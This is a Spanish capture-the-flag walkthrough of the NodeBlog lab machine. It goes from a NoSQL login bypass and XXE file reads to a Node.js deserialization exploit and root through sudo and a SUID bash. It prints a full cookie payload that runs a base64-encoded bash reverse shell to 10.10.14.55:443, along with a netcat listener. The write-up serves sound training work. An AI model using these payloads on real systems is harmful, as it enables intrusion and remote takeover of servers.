# NodeBlog

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: NoSQL Injection (Authentication Bypass) / XXE File Read / NodeJS Deserialization Attack (IIFE Abusing) / Mongo Database Enumeration

Te prepara para las **Certificaciones**: eJPT eWPT

![image](https://github.com/user-attachments/assets/395644d6-020a-4ce1-8373-5ca37d4b714d)<br><br>

# Reconocimiento

Utilizando `nmap` escaneamos todos los puertos<br>

![image](https://github.com/user-attachments/assets/4706e6e1-3901-48ca-a913-aed124e87ef9)

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>

`http://10.10.11.139:5000/login` -> Vemos un panel de autenticación<br><br>

# Explotación NoSQL

Utilizando una Query NOSQL nos permite entrar en `http://10.10.11.139:5000/login`, 
Hay que tener en cuenta el `Content-Type: application/json`, 
`"password":{"$ne":"admin"}` -> Quiere decir que la contraseña NO es admin.<br>

![image](https://github.com/user-attachments/assets/300b4145-da3c-4b70-aa42-5475482e8c0d)<br><br>

# Explotación XXE

Tenemos un campo de subida de archivos<br>

![image](https://github.com/user-attachments/assets/abaa0b9d-2b8d-453e-b84b-5554c50d2469)<br><br>


Nos indica la sintaxis  XML <br>

![image](https://github.com/user-attachments/assets/5644d81d-dae4-4d72-aadd-b90b581f0828)<br><br>


Con `burpsuite` hacemos la estructura XML y mostramos los puertos  haciendo `echo $(0x0035)` es el 53 por ejemplo, podemos ver los puertos que no veíamos desde nuestra maquina<br>

![image](https://github.com/user-attachments/assets/8367e387-ddfd-4edf-99ae-f66462889eb4)<br><br>


# Explotación Unserelize

Si acontecemos un error en el `NOSQL` podemos suponer que la raiz del servidor esta en `/opt/blog`<br>


![image](https://github.com/user-attachments/assets/f79f9011-2c8e-438f-bf27-bce7a6db3964)<br><br>



- Buscamos `server.js` por que es por defecto como están los servidores de js.
- Vemos que importa el `const serialize`.
- Luego hace un `c = serialize.unserialize`.
- Y Leemos que `c` tiene algo que ver con la `cookie`, entonces podemos suponer que  la cookie viaja serialize y luego el servidor la  unserialize.<br><br>

![image](https://github.com/user-attachments/assets/77df1566-d4e1-4d87-9ea1-6e2e1d8dc56f)<br><br>

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ -> Este articulo muestra los ataques posibles. **nosotros debemos hacer el de unserialize**<br>

Esta es la data que voy a intentar mandar a ver si me llega la reverse shell, la urlencode con `burpsuite` y la pego en mi `cookie`<br>

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo IyEvYmluL2Jhc2gKCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTUvNDQzIDA+JjEK | base64 -d | bash',function(error, stdout, stderr) { console.log(stdout) });}()"}
```
- rlwrap nc -nlvp 443<br><br>

La urlencode con `burpsuite`<br>

![image](https://github.com/user-attachments/assets/59432a6b-b17d-458b-a31d-f14f89f15652)<br><br>

Lo pego en la `Cookie` y recargo la pagina<br>

![2024-07-29_18-42](https://github.com/user-attachments/assets/ca6c3045-d8d8-4b74-8eb3-e38507fa54e1)<br><br>



# Escalada de privilegios

Hacemos: `chmod 777 admin`, `cd admin` y ya nos deja entrar, vemos la flag del user:<br>

![image](https://github.com/user-attachments/assets/9be4271f-6190-4c23-8d0d-be260f3ba02f)<br><br>

### Mongo (TCP 27017)

- `mongo` -> nos conectamos
- `show dbs` -> vemos base de datos
- `use blog` -> usamos base de datos
- `show collections` -> Listar colecciones 
- `db.users.find()` -> Vemos el usuario "admin" y la contraseña<br><br>


 `sudo -l` -> Vemos que podemos poner cualquier comando con sudo, entonces nos ponemos `SUID` la bash y la lanzamos con `bash -p`, somos root<br>
 
![image](https://github.com/user-attachments/assets/8f1ac9ba-6cd9-4612-9160-2cbc4466f49b)<br><br>


Flag final:<br>

![image](https://github.com/user-attachments/assets/27b38a6e-57ff-4114-b2bc-b0c8e16b2764)<br><br>


